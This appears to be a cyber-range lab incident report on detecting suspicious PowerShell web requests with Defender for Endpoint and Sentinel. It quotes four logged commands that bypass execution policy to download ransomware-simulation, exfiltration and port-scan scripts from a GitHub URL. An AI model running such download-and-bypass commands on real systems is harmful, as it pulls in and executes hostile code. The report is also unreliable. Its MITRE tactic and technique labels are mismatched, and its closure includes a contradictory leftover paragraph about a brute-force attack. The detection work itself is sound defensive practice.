
## Incident Response: PowerShell Suspicious Web Request

### **Preparation**

- Roles and responsibilities for incident response are documented within the SOC team.

- Microsoft Defender for Endpoint (MDE) and Microsoft Sentinel are deployed and configured for endpoint monitoring and alerting.

- Staff are trained on incident detection, investigation, and containment procedures.

- Network Security Groups (NSGs) are in place but will be enhanced post-incident.


### **Detection and Analysis**

- An alert was defined to trigger for suspicious web requests executed from PowerShell scripts on the virtual host machine `win-vm-mde`. The `DeviceProcessEvents` table was used to uncover more information regarding the incident.

![image](https://github.com/user-attachments/assets/dc3f7fe7-71f8-4244-a3d2-af9cd2b3ef59)



<img width="1440" alt="Screenshot 2025-06-13 004249" src="https://github.com/user-attachments/assets/059f7db2-73a4-48b8-aa08-c619a7510df6" />

- There were 5 processes that were created in which PowerShell was used to run a command that contained `Invoke-WebRequest`. It is safe to assume that this command is pulling from an external URL to download and potentially run a script. 



- A rule was created to monitor any suspiciously created web request. Specifically, the rule was to detect any processes that included `Invoke-WebRequest` as one of its commands. This command is common to download files or scripts from websites or servers on the internet. This would evade traditional defence solutions as these solutions may not be configured to detect these types of commands from PowerShell that is ran on the host machine.

<img width="727" alt="Pasted image 20250612195543" src="https://github.com/user-attachments/assets/daf7a2c6-10c8-4506-81d1-cafe2dea76f0" />


- The appropriate Tactics, Techniques and Procedures (TTPs) from the MITRE ATT&CK Framework were selected for this detection rule.
  - Credential Access (TA0002)
    - Command and Scripting Interpreter (T1059)
      - PowerShell (T1059.001)
    - Exploitation for Client Execution (T1023)
  - Command and Control (TA0011)
    - Application Layer Protocol (T1071)
      - Web Protocols (T1071.001)
    - Ingress Tool Transfer (T1105)
  - Exfiltration (TA0010)
    - Exfiltration Over C2 Channel (T1041)
   
<img width="547" alt="Pasted image 20250612200020" src="https://github.com/user-attachments/assets/c55cb257-1e0a-4dbc-b9d2-8e077846014b" />

<img width="550" alt="Pasted image 20250612200103" src="https://github.com/user-attachments/assets/fc28d953-0db0-45d8-8703-e77b86ab37a5" />

<img width="550" alt="Pasted image 20250612200132" src="https://github.com/user-attachments/assets/efa3ff45-9e78-472f-ba24-eeb4ced3c507" />

<img width="412" alt="Pasted image 20250612200149" src="https://github.com/user-attachments/assets/976cd3f4-cba0-4e28-9748-356c771a1453" />

![image](https://github.com/user-attachments/assets/61e1553f-5790-4b01-aa4d-ef605a3a8613)

Another query will be executed against the data in the Log Analytics workspace to log the account `win-vm-mde` and the device name to see if a user has been invoking malicious PowerShell commands such as `Invoke-WebRequest`.


![image](https://github.com/user-attachments/assets/948e20eb-be81-4d74-988e-39b82bcd0f32)

After the rule was created, we see five entities: the host machine `win-vm-mde` and the 4 different PowerShell commands that were executed.


<img width="1521" alt="Screenshot 2025-06-12 203510" src="https://github.com/user-attachments/assets/ddf32244-2289-4812-86a3-2c030fdaa875" />

<img width="1507" alt="Screenshot 2025-06-12 203844" src="https://github.com/user-attachments/assets/8bcf4bfb-9856-401d-aebd-9c92dc8dee5a" />


![image](https://github.com/user-attachments/assets/a7b19096-eba4-4c75-b4a7-605c23cd2527)


![image](https://github.com/user-attachments/assets/8c279499-9b01-4a37-83e8-18bef1064964)


Upon investigating the triggered incident `Alert PowerShell Suspicious Web Request Rule`, the user `ylavnu` downloaded 4 different scripts with 4 different commands on the host machine `win-vm-mde`. The following commands were

`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`

`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`

`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1`

`powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1`

![image](https://github.com/user-attachments/assets/1a5b9297-7f69-46af-84ac-733aee1430f4)


![image](https://github.com/user-attachments/assets/ec4ad430-8aa5-4ed6-b2bf-04a958ead84d)



The user `ylavnu` was contacted and asked what they were doing on their PC around the time of the logs being generated and they said they tried to install a free piece of software, which resulted in a black screen for a few seconds, and then 'nothing happened' afterwards. 


 It is known at this point that the scripts were downloaded but it was not confirmed if they were executed. Another query was run.



![image](https://github.com/user-attachments/assets/4adb0e5b-62cd-473a-95e0-616095f5e3f3)

It was determined that the downloaded scripts actually did run. The scripts were then passed off to the malware reverse engineering team. Here were the short descriptions for each script:

### portscan.ps1: Scans a specified range of IP addresses for open ports from a list of common ports and logs the results.

### eicar.ps1: Creates an EICAR test file, which tests antivirus solutions and logs the process.

### exfiltratedata.ps1: Generates fake employee data, compresses it into a ZIP file, and uploads it to an Azure Blob Storage container, simulating data exfiltration.

### pwncrypt.ps1: Encrypts files in a selected user's desktop folder, simulating ransomware activity and creates a ransom note with decryption instructions.





### **Containment, Eradication and Recovery**

- The affected VM was isolated using Microsoft Defender for Endpoint (MDE).

<img width="1547" alt="Screenshot 2025-06-11 210357" src="https://github.com/user-attachments/assets/973f0fd2-e37c-416a-bffd-bc3981ccf6fa" />

- A full antimalware scan was performed on the VM through MDE.

- After the machine was returned with no trace of malware, it was removed from isolation.


### **Closure**

The incident response team has reviewed and confirmed the resolution of the event. All containment and remediation steps have been completed, and relevant findings have been documented. This incident has been classified as a `True Positive – Suspicious Activity`. A brute force attack was detected targeting the `win-vm-mde` host. However, all attempts were unsuccessful, and no unauthorised access was achieved.


Ordered the affected user go through extra rounds of cybersecurity awareness training and upgraded the training package from KnowBe4 and increased frequency. Also implemented a policy that restricts the use of PowerShell for non-essential users. This incident has been classified as a `True Positive - Suspicious Activity`. The user `ylavnu` downloaded 4 malicious PowerShell scripts from an external URL and executed them in the network environment. However, it was discovered that the user misjudged the contents and effects of the scripts and claimed it was an accident. No further suspected damage or persistence was recognised. 





